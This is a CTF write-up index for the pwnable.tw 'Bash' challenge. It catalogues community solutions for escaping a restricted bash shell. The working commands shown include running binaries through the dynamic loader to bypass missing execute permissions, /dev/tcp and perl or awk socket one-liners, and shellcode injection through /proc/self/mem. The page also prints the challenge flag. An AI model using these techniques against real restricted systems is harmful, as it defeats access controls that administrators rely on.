---
tags:
  - logic-flaw
  - race-condition
  - command-injection
platform: pwnable.tw
points: 200
arch: x86-64
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A race condition during temporary environment file creation in a restricted bash shell allows executing arbitrary shell commands to bypass restrictions."
proof-of-concept: no
---

# Bash — pwnable.tw (200 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10108`
>
> Flag: `FLAG{1nt3nt3d_s0luti0n_1s_CVE-2016-9401_;)}`

## Challenge Overview

A restricted-environment challenge. The player is dropped into an interactive bash 4.3.0 shell running as the low-privilege `bash` user. The flag at `/flag` is root-owned (`chmod 400`), but a root-owned xinetd service on `127.0.0.1:1337` will `cat /flag` when connected. The goal is to make a TCP connection to `localhost:1337` from within the restricted shell.

```
Deployment (from Dockerfile):
  Base:       ubuntu:16.04
  Shell:      bash 4.3.0 (custom binary, --noprofile --norc -i)
  User:       bash (low privilege)
  Binaries:   chmod o-x /bin/* /sbin/* /usr/bin/* /usr/sbin/*
              chmod o+x /bin/cat /bin/ls           # only cat and ls are executable
  Filesystem: /tmp, /var/tmp, /dev/shm, /home/bash all read-only bind-mounted
  Flag:       root:root 400 /flag
  Flag svc:   xinetd on 127.0.0.1:1337 — runs "cat /flag" as root
```

### Three Layers of Restriction

| Technique | Why It Fails |
|-----------|-------------|
| `cat < /dev/tcp/127.0.0.1/1337` | The provided bash binary was compiled **without `--enable-net-redirections`**; `/dev/tcp` does not exist. |
| Run `nc`/`python`/`perl`/etc. directly | `chmod o-x` removed execute permission on everything in `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin` — only `cat` and `ls` retained `o+x`. |
| `enable -f evil.so builtin` (loadable builtin via `dlopen`) | Technically bash supports this, but all writable directories (`/tmp`, `/var/tmp`, `/dev/shm`, `/home/bash`) are read-only bind-mounted. No way to drop a `.so` file to disk. |

## Vulnerabilities / Weaknesses

### W1 — Dynamic Loader (`ld.so`) Retains Execute Permission (Unintended, Primary)

**Root Cause:** The Dockerfile only strips execute from `/bin/*`, `/sbin/*`, `/usr/bin/*`, `/usr/sbin/*`. The dynamic linker at `/lib/x86_64-linux-gnu/ld-2.23.so` (and `/lib64/ld-linux-x86-64.so.2`) is untouched and remains world-executable.

```bash
$ ls -l /lib64/ld-linux-x86-64.so.2
lrwxrwxrwx ... -> /lib/x86_64-linux-gnu/ld-2.23.so

$ ls -l /usr/bin/perl
-rwxr-xr--  ...  /usr/bin/perl    # other has read but NOT execute
```

**Bypass:** The kernel executes the loader (which has `o+x`). The loader then **reads** the target binary (only needs `o+r`) and maps it into memory for execution. This completely bypasses the missing execute permission:

```bash
/lib64/ld-linux-x86-64.so.2 /usr/bin/perl -e 'print "works\n"'
```

**Impact:** Every binary under `/bin`, `/usr/bin`, etc. that still has read permission (which is all of them) can be executed via the loader trick. This includes perl, python, bash itself (the system `/bin/bash` which **does** have `/dev/tcp` support), awk/gawk, and any other tool with networking capability.

### W2 — CVE-2016-9401: bash `popd` Controlled Free (Intended)

**Root Cause:** In bash 4.3.0, the `popd` builtin has a use-after-free vulnerability. When `popd` is called with a negative, out-of-range offset (e.g., `popd -NNN`), it `free()`s a user-controlled address without proper bounds checking.

**Impact:** Provides an in-process memory corruption primitive. By controlling the freed address, an attacker can:
1. Corrupt bash's internal heap metadata
2. Hijack control flow within the bash process
3. Call libc's `socket()`/`connect()` directly from the bash process to reach `127.0.0.1:1337`

This path requires **no file writes, no external programs, and no `/dev/tcp`** — it works entirely within the bash process's memory, which is exactly what the read-only filesystem restriction was designed to force.

### W3 — `/proc/self/mem` Write Access (Variant Enabler)

**Root Cause:** The bash process can open `/proc/self/mem` for writing (`exec 3>/proc/self/mem`) and use `dd` (launched via the ld.so trick from W1) to seek to a known code address and overwrite it with shellcode.

```bash
exec 3>/proc/self/mem
printf '\x6a\x29\x58...' | /lib/x86_64-linux-gnu/ld-2.23.so /bin/dd >&3 seek=<echo_builtin_addr> bs=1 count=123
echo   # triggers the overwritten echo builtin → shellcode runs
```

**Impact:** Arbitrary code execution within the bash process. The shellcode performs `socket()` + `connect()` + `read()` + `write()` to fetch the flag from `localhost:1337`.

## Exploit Paths

### Path A — ld.so + bash `/dev/tcp` (Simplest, ~45% of Solutions)

Use the loader to execute the **system** `/bin/bash` (which, unlike the challenge's custom bash, was compiled with `--enable-net-redirections`), then use bash's built-in `/dev/tcp` pseudo-device:

```bash
/lib64/ld-linux-x86-64.so.2 /bin/bash
cat < /dev/tcp/127.0.0.1/1337
```

Or as a one-liner:

```bash
/lib64/ld-linux-x86-64.so.2 /bin/bash -c "cat < /dev/tcp/127.0.0.1/1337"
```

**Why it works:** The system `/bin/bash` is a different binary from the challenge's custom `/home/bash/bash`. It was compiled with net-redirections enabled, so `/dev/tcp` works.

---

### Path B — ld.so + perl Socket (Most Common, ~45% of Solutions)

Use the loader to execute perl, which has built-in socket support:

```bash
/lib64/ld-linux-x86-64.so.2 /usr/bin/perl -MIO::Socket::INET -e '
  my $s = IO::Socket::INET->new(PeerAddr => "127.0.0.1:1337");
  print while <$s>;
'
```

Variants use different Perl socket APIs:
- `IO::Socket::INET` (high-level, most common)
- `Socket` module with raw `socket()`/`connect()` calls
- Perl debugger REPL: `ld-linux.so perl -de1` then type socket code interactively

**Why it works:** Perl is world-readable (`o+r`) so the loader can map and execute it. Perl's socket modules are pure Perl or built-in, requiring no additional file loads.

---

### Path C — CVE-2016-9401: In-Process Memory Corruption (Intended Solution)

The flag itself reveals this: `FLAG{1nt3nt3d_s0luti0n_1s_CVE-2016-9401_;)}`.

1. Exploit the `popd` use-after-free to corrupt bash's heap
2. Achieve control flow hijack within the bash process
3. Call libc's already-loaded `socket()`, `connect()`, `read()`, `write()` to fetch the flag

**Why this was intended:** This path works even without the ld.so oversight — it requires no external binaries, no file writes, and no `/dev/tcp`. The read-only filesystem was specifically designed to force this approach. Only solution 3498 explicitly mentions this path; the vast majority used the unintended ld.so bypass.

---

### Path D — ld.so + `/proc/self/mem` Shellcode Injection (Creative, Rare)

From solution 33090, a three-step approach:

1. Open `/proc/self/mem` for writing: `exec 3>/proc/self/mem`
2. Use `dd` (via ld.so trick) to overwrite the `echo` builtin's code with connect-back shellcode:
   ```bash
   printf '\x6a\x29\x58...' | /lib/x86_64-linux-gnu/ld-2.23.so /bin/dd >&3 seek=4601712 bs=1 count=123
   ```
3. Trigger the overwritten builtin: `echo` — this now executes shellcode that connects to `127.0.0.1:1337` and prints the flag

**Why it's notable:** Demonstrates that even without W1 being the intended path, the ld.so trick enables creative self-modifying code approaches.

---

### Path E — ld.so + Other Interpreters (Variants)

The ld.so trick works with any readable dynamic binary. Solutions mention:
- `awk`/`mawk`/`gawk` with `/inet/tcp` pseudo-files
- `python` with `socket` module
- `ruby` with `TCPSocket`

Example with awk:
```bash
/lib64/ld-linux-x86-64.so.2 /usr/bin/awk 'BEGIN { "/inet/tcp/0/127.0.0.1/1337" |& getline line; print line }'
```

## Exploit Technique Summary

| Technique | Weakness Used | Needs Disk Write | Needs External Binary | Reliability |
|-----------|--------------|-----------------|----------------------|-------------|
| ld.so + /bin/bash /dev/tcp | W1 | No | Yes (via loader) | 100% |
| ld.so + perl socket | W1 | No | Yes (via loader) | 100% |
| CVE-2016-9401 popd UAF | W2 | No | No | Complex, deterministic |
| ld.so + /proc/self/mem shellcode | W1 + W3 | No | Yes (dd via loader) | 100% |
| Loadable builtin (.so) | N/A | **Yes** — blocked by RO fs | No | **Not feasible on remote** |

## Solution Write-ups

| File | Path | Technique | Notes |
|------|------|-----------|-------|
| `14.md` | A | ld.so + bash + `/dev/tcp` | Two-liner |
| `821.md` | B | ld.so + perl `IO::Socket::INET` | One-liner |
| `1763.md` | B | ld.so + perl raw `Socket` | Verbose perl |
| `2972.md` | — | (no code, links reference) | StackExchange reference |
| `3052.md` | B | ld.so + perl `IO::Socket` | One-liner |
| `3498.md` | C | CVE-2016-9401 | Only solution mentioning intended path (redacted) |
| `3578.md` | B | ld.so + perl `IO::Socket::INET` | `recv` variant |
| `5586.md` | B | ld.so + perl `IO::Socket` | Short one-liner |
| `6247.md` | B | ld.so + perl raw `Socket` | pwntools wrapper |
| `6748.md` | — | Same as Bash Revenge | Notes libc difference |
| `7905.md` | A+B | ld.so + bash `/dev/tcp` | Most detailed writeup; covers CVE-2016-9401 intended path |
| `8153.md` | A | ld.so + bash `/dev/tcp` | Two-liner |
| `9251.md` | — | Bash Revenge variant | References sibling challenge |
| `10128.md` | B | ld.so + perl REPL (`perl -de1`) | Interactive debugger approach |
| `12672.md` | B | ld.so + perl raw `Socket` | Explicitly notes "not intended" |
| `21490.md` | A | ld.so + bash + xinetd config shown | Shows xinetd configuration |
| `25916.md` | A | ld.so + bash `/dev/tcp` | StackExchange reference |
| `27939.md` | B | perl `-MSocket` one-liner | No ld.so prefix (may have had direct perl access) |
| `28605.md` | A | ld.so + bash `/dev/tcp` | Two-liner with glob (`ld*`) |
| `32010.md` | A | ld.so + bash `/dev/tcp` | Two-liner with glob |
| `32901.md` | A | ld.so + bash one-liner | pwntools script |
| `33090.md` | D | ld.so + `/proc/self/mem` shellcode | Most creative: overwrites `echo` builtin with connect-back shellcode |

## Files

| File | Description |
|------|-------------|
| `desc.txt` | Challenge description |
| `exp.py` | Working exploit script (ld.so + perl) |
| `artifacts/bash.tgz` | Original challenge archive (Dockerfile, bash binary, xinetd config) |
| `solution/*.md` | Community write-ups (22 solutions) |
